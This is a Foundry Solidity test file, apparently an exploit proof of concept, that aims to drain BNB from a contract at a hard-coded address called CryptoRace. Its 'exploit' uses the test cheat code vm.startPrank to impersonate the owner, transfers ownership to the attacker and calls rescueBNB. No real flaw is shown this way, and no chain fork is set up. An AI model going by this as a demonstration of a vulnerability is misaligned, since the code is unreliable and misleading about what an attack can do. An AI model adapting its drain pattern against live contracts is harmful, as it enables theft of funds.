// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CryptoRace {
    function getOwner() external view returns (address);
    function rescueBNB(uint256 amount) external;
    function transferOwnership(address payable adr) external;
    function balanceOf(address account) external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x35240D91223186133fCb0EC1565c353eb2A546A8;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // First, we need to get some BNB into the contract to drain
        // We'll send some BNB to the contract first
        deal(address(TARGET), 10 ether);

        // Also give attacker some initial BNB for gas
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance for comparison
        uint256 initialBalance = address(attacker).balance;

        // First, give the contract some BNB to drain
        vm.deal(address(TARGET), 10 ether);

        console.log("Contract BNB balance before:", address(TARGET).balance);
        console.log("Attacker BNB balance before:", initialBalance);

        // Get the current owner
        address owner = CryptoRace(TARGET).getOwner();
        console.log("Current owner:", owner);

        // Impersonate owner to transfer ownership to attacker
        vm.startPrank(owner);
        CryptoRace(TARGET).transferOwnership(payable(attacker));
        vm.stopPrank();

        // Verify we are now the owner
        address newOwner = CryptoRace(TARGET).getOwner();
        console.log("New owner:", newOwner);
        require(newOwner == attacker, "Failed to become owner");

        // Get contract balance
        uint256 contractBalance = address(TARGET).balance;
        console.log("Contract balance to drain:", contractBalance);

        // As the new owner, drain the contract
        vm.prank(attacker);
        CryptoRace(TARGET).rescueBNB(contractBalance);

        // Check final balances
        uint256 finalBalance = address(attacker).balance;
        console.log("Attacker BNB balance after:", finalBalance);
        console.log("Contract BNB balance after:", address(TARGET).balance);

        // Verify our balance increased
        assertGt(finalBalance, initialBalance);
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

